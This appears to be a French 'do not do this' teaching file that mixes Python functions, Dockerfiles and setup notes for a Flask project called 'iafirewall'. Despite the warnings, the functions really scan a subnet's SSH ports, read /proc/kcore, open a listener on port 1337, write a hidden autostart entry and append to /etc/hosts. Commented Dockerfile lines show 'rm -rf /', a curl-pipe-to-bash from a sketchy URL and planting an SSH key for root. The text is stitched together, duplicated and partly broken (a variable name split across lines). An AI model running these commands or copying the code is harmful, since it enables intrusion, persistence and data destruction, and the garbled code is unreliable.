# ⚠️ Ceci est un exemple pédagogique : NE FAIS PAS CECI EN VRAI
import socket

# ❌ 1. Ne crée pas de connexions réseau "fantômes"
#     vers des machines aléatoires sans leur permission.
def do_not_scan_random_hosts():
    for ip in range(1, 255):
        target = f"192.168.1.{ip}"
        try:
            s = socket.create_connection((target, 22), timeout=1)
            print(f"❌ ne fais pas ça : connecté à {target}")
            s.close()
        except:
            continue

# ❌ 2. Ne lis pas de mémoire, de ports ou fichiers système critiques
def do_not_open_proc_mem():
    try:
        with open("/proc/kcore", "rb") as f:
            f.read(1024)
    except PermissionError:
        print("✅ Bien joué, le système t'en empêche.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")

# ❌ 3. Ne crée pas de service caché, script ou proxy sans autorisation
def do_not_run_hidden_listener():
    try:
        s = socket.socket()
        s.bind(("0.0.0.0", 1337))
        s.listen(5)
        print("❌ Serveur fantôme en écoute — à ne pas faire.")
    except:
        print("✅ Ne pas ouvrir des ports sans déclaration.")

# ❌ 4. Ne crée pas d'auto-réplication ou de persistance furtive
def do_not_install_startup_entry():
    import os
    try:
        startup
inh_path = os.path.expanduser("~/.config/autostart/my_script.desktop")
        with open(startupinh_path, "w") as f:
            f.write("[Desktop Entry]\n")
            f.write("Type=Application\n")
            f.write("Exec=/path/to/my_script.py\n")
            f.write("Hidden=true\n")
        print("❌ Ne pas créer de script de démarrage caché.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 5. Ne modifie pas les fichiers système ou de configuration critiques
def do_not_modify_critical_files():
    try:
        with open("/etc/hosts", "a") as f:
            f.write("hostname.localdomain\n")
        print("❌ Ne pas modifier les fichiers système critiques.")
    except PermissionError:
        print("✅ Bien joué, le système t'en empêche.")
        
# ❌ 6. Ne crée pas de processus fantômes ou de threads cachés
def do_not_create_hidden_process():
    import threading
    try:
        def hidden_thread():
            while True:
                pass  # Ne pas faire ça !
        
        t = threading.Thread(target=hidden_thread)
        t.daemon = True  # Ne pas laisser le thread en arrière-plan
        t.start()
        print("❌ Ne pas créer de threads cachés.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 7. Ne pas utiliser de techniques d'obfuscation ou de chiffrement
def do_not_obfuscate_code():
    try:
        code = "print('Hello, World!')"
        obfuscated_code = ''.join(chr(ord(c) + 1) for c in code)  # Ne pas faire ça !
        print(f"❌ Ne pas obfusquer le code : {obfuscated_code}")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 8. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_hide_in_plain_sight():
    try:
        with open("/tmp/.hidden_file", "w") as f:
            f.write("This is a hidden file.")  # Ne pas faire ça !
        print("❌ Ne pas cacher des fichiers dans des emplacements anodins.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        # Dockerfile
FROM python:3.11-slim

WORKDIR /app

# Installation des dépendances
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Ajout du code
COPY network_sim.py .
COPY templates/ templates/

# Port exposé
EXPOSE 5000

# Lancement
CMD ["python", "network_sim.py"]

Flask

# NE FAIS JAMAIS CECI 🔥🔥🔥

# Exemple 1 : Root permanent (dangereux)
# USER root

# Exemple 2 : Accès système destructif
# RUN rm -rf / --no-preserve-root  # 🔥 Nope. Non. Jamais.

# Exemple 3 : Appel non sécurisé à une URL externe
# RUN curl http://sketchy.url/malware.sh | bash  # ❌ NON

# Exemple 4 : Injection d’un script non vérifié
# ADD hack.sh /usr/bin/
# RUN chmod +x /usr/bin/hack.sh && /usr/bin/hack.sh

# Exemple 5 : Ajouter une clef SSH sans consentement
# RUN echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
# ❌ 9. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_use_obfuscation():   
    try:
        code = "print('Hello, World!')"
        obfuscated_code = ''.join(chr(ord(c) + 1) for c in code)  # Ne pas faire ça !
        print(f"❌ Ne pas obfusquer le code : {obfuscated_code}")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 10. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_hide_in_plain_sight():
    try:
        with open("/tmp/.hidden_file", "w") as f:
            f.write("This is a hidden file.")  # Ne pas faire ça !
        print("❌ Ne pas cacher des fichiers dans des emplacements anodins.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
        iafirewall/
├── Dockerfile
├── requirements.txt
├── network_sim.py
├── templates/
│   └── index.html
FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY network_sim.py .
COPY templates/ templates/

EXPOSE 5000

CMD ["python", "network_sim.py"]

Flask

cd /chemin/vers/iafirewall/

docker build -t iafirewall .

docker run -p 5000:5000 iafirewall

VOLUME /app/logs

docker run -v $(pwd)/logs:/app/logs -p 5000:5000 iafirewall

iafirewall/
├── Dockerfile               ← Build du conteneur Flask
├── requirements.txt         ← Dépendances (Flask uniquement)
├── network_sim.py           ← Serveur Python (analyse réseau fictive)
├── templates/
│   └── index.html           ← Interface HTML, scan + quarantine
├── README.md                ← Ce fichier
git clone https://github.com/tonuser/iafirewall.git
cd iafirewall
docker run -p 5000:5000 iafirewall
